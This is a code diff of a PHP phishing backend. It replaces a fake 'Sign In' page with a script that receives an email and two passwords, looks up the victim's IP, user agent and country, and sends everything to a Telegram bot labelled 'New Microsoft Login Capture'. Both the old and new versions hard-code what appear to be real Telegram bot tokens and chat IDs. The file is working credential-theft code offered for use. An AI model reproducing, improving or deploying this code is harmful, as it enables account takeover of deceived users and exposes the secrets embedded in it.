@@ -1,51 +1,93 @@
 <?php
-// ==== TELEGRAM CONFIG ====
-$TOKEN    = "8146877130:AAETaFmSH5Sx-UPSwtFOsNPkJSR8pf3ZXJw";
-$CHAT_ID  = "5279025133";
+header('Content-Type: application/json; charset=UTF-8');
 
-function sendTelegram($msg) {
-    global $TOKEN, $CHAT_ID;
-    $url = "https://api.telegram.org/bot$TOKEN/sendMessage";
-    $data = ['chat_id' => $CHAT_ID, 'text' => $msg, 'parse_mode' => 'HTML'];
-    file_get_contents($url . '?' . http_build_query($data));
+// Telegram credentials - HARDCODED FOR CPANEL
+$botToken = '8174653415:AAHrooy08a23wwvICmwsMZX46IT-3w6QIR8';
+$chatId = '6375926160';
+
+// Helper function for cURL requests (works with allow_url_fopen disabled)
+function curlRequest($url, $method = 'GET', $postData = null, $timeout = 5) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    
+    if ($method === 'POST' && $postData) {
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+    }
+    
+    $response = curl_exec($ch);
+    $error = curl_error($ch);
+    curl_close($ch);
+    
+    if ($error) {
+        return ['error' => $error, 'data' => null];
+    }
+    
+    return ['error' => null, 'data' => $response];
 }
 
-// ==== POST → send to Telegram ====
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    header('Content-Type: application/json');
-    $user = trim($_POST['username'] ?? '');
-    $pass = trim($_POST['password'] ?? '');
-    $ip   = $_SERVER['REMOTE_ADDR'];
-    $time = date('Y-m-d H:i:s');
+// Get form data
+$email = isset($_POST['email']) ? $_POST['email'] : '';
+$password1 = isset($_POST['password1']) ? $_POST['password1'] : '';
+$password2 = isset($_POST['password2']) ? $_POST['password2'] : '';
 
-    $txt = "New Hit\nTime: $time\nIP: $ip\nUsername: $user\nPassword: $pass";
-    sendTelegram(preg_replace('/\n/', "%0A", $txt));   // works even without cURL
+// Get visitor info
+$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+if (strpos($ip, ',') !== false) {
+    $ip = trim(explode(',', $ip)[0]);
+}
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+$timestamp = date('Y-m-d H:i:s');
 
-    echo json_encode(['success'=>false, 'message'=>'Wrong credentials']);
-    exit;
+// Get country from IP using cURL
+$country = 'Unknown';
+if ($ip !== 'Unknown' && $ip !== '127.0.0.1') {
+    $geoResult = curlRequest("http://ip-api.com/json/{$ip}", 'GET', null, 3);
+    if ($geoResult['error'] === null && $geoResult['data']) {
+        $geo = json_decode($geoResult['data'], true);
+        if (isset($geo['country'])) {
+            $country = $geo['country'];
+            if (isset($geo['countryCode'])) {
+                $country .= " ({$geo['countryCode']})";
+            }
+        }
+    }
 }
 
-// ==== GET → show login form ====
+// Send to Telegram if credentials are set
+if ($botToken && $chatId && $email && $password2) {
+    $message = "🔐 *New Microsoft Login Capture*\n\n";
+    $message .= "📧 *Email:* `{$email}`\n";
+    $message .= "🔑 *Password 1:* `{$password1}`\n";
+    $message .= "🔑 *Password 2:* `{$password2}`\n\n";
+    $message .= "🌐 *IP:* `{$ip}`\n";
+    $message .= "🌍 *Country:* `{$country}`\n";
+    $message .= "📱 *User Agent:* `{$userAgent}`\n";
+    $message .= "🕐 *Time:* `{$timestamp}`";
+    
+    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $postData = http_build_query([
+        'chat_id' => $chatId,
+        'text' => $message,
+        'parse_mode' => 'Markdown'
+    ]);
+    
+    $telegramResult = curlRequest($telegramUrl, 'POST', $postData, 5);
+    
+    if ($telegramResult['error'] === null && $telegramResult['data']) {
+        $response = json_decode($telegramResult['data'], true);
+        if (isset($response['ok']) && $response['ok'] === true) {
+            echo json_encode(['success' => true, 'message' => 'Sent to Telegram']);
+        } else {
+            echo json_encode(['success' => false, 'message' => 'Telegram API error', 'details' => $response]);
+        }
+    } else {
+        echo json_encode(['success' => false, 'message' => 'cURL error', 'error' => $telegramResult['error']]);
+    }
+} else {
+    echo json_encode(['success' => false, 'message' => 'Missing credentials or data']);
+}
 ?>
-<!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>Sign In</title>
-<style>body{font-family:Arial;max-width:380px;margin:60px auto;background:#f9f9f9;padding:20px;}
-input,button{width:100%;padding:12px;margin:8px 0;border-radius:8px;border:1px solid #ccc;box-sizing:border-box;}
-button{background:#007bff;color:#fff;font-size:16px;border:none;cursor:pointer;}</style>
-</head><body>
-<h1>Sign In</h1>
-<form id="f">
-<input type="text" name="username" placeholder="Username" required>
-<input type="password" name="password" placeholder="Password" required>
-<button type="submit">Login</button>
-</form>
-<script>
-document.getElementById('f').onsubmit=async e=>{
-e.preventDefault();
-let d=new FormData(e.target);
-let r=await fetch('',{method:'POST',body:d});
-let j=await r.json();
-alert(j.message);
-};
-</script>
-</body></html>
